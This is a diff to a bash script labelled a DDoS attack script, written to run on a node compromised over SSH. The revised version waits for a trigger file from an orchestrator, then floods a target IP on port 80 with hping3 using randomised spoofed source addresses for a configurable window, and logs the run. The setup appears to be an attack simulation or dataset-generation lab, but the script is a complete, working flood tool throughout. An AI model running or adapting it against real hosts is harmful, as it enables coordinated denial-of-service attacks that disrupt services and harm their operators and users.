@@ -1,47 +1,51 @@
 #!/bin/bash
 # Hping3 DDoS Attack Script
 # Runs ON THE COMPROMISED NODE after SSH compromise
-# Starts at T=60s (1 min), stops at T=120s (2 min)
-# Attack duration: 60 seconds
+# Synchronized: waits for trigger file /tmp/.hping3_start to be created by orchestrator
 #
-# Usage: hping3_attack.sh <TARGET_IP>
-#        or set TARGET_IP env var
+# Usage: hping3_attack.sh <TARGET_IP> <ATTACK_START> <ATTACK_STOP>
+#   TARGET_IP     = target IP to flood
+#   ATTACK_START  = T+seconds when attack starts  (default: 60)
+#   ATTACK_STOP   = T+seconds when attack stops    (default: 120)
+#
+# Or via env vars:
+#   export TARGET_IP=... ATTACK_START=... ATTACK_STOP=...
 
 TARGET_IP="${1:-${TARGET_IP:-}}"
+ATTACK_START="${2:-${ATTACK_START:-60}}"
+ATTACK_STOP="${3:-${ATTACK_STOP:-120}}"
 
 if [ -z "$TARGET_IP" ]; then
     echo "[-] ERROR: TARGET_IP is not set (neither as argument nor env var)"
-    echo "[-] Usage: $0 <TARGET_IP>  or  export TARGET_IP=<IP>"
+    echo "[-] Usage: $0 <TARGET_IP> [ATTACK_START] [ATTACK_STOP]"
+    echo "[-]   or export TARGET_IP=<IP> ATTACK_START=<N> ATTACK_STOP=<N>"
     exit 1
 fi
 
-ATTACK_START=60
-ATTACK_STOP=120
-
-echo "[*] Hping3 DDoS Attack - Compromised Node"
+echo "[*] Hping3 Synchronized DDoS - Compromised Node"
 echo "[*] Target: $TARGET_IP"
-echo "[*] Attack starts at T+60s, stops at T+120s"
-echo "[*] Current time: $(date)"
+echo "[*] Attack window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"
+echo "[*] Waiting for orchestrator trigger signal..."
 
-# Phase 1: Wait until 1 minute mark
-echo "[*] Waiting until attack start (60s)..."
-sleep $ATTACK_START
-echo "[*] Attack start time: $(date)"
+# Wait for trigger file from orchestrator (sync point)
+while [ ! -f /tmp/.hping3_start ]; do
+    sleep 0.1
+done
+echo "[*] Trigger received at T+${ATTACK_START}s: $(date)"
 
-# Phase 2: Launch hping3 flood attack
+# Launch hping3 flood attack
 hping3 --flood --destport 80 --rand-source $TARGET_IP &
 HPING_PID=$!
 echo "[*] hping3 started with PID: $HPING_PID"
 
-# Phase 3: Wait until 2 minute mark then stop attack
-echo "[*] Attack running... (will stop at T+120s)"
+# Wait until stop time
 sleep $((ATTACK_STOP - ATTACK_START))
-echo "[*] Attack stop time: $(date)"
+echo "[*] Stop time reached at T+${ATTACK_STOP}s: $(date)"
 
 # Kill hping3
 kill $HPING_PID 2>/dev/null
 wait $HPING_PID 2>/dev/null
-echo "[*] hping3 stopped. Attack complete."
+echo "[*] hping3 stopped. Attack complete on $(hostname)."
 
 # Record evidence
 echo "Hping3 attack executed on $(hostname) at $(date)" >> /var/log/hping3_attack.log
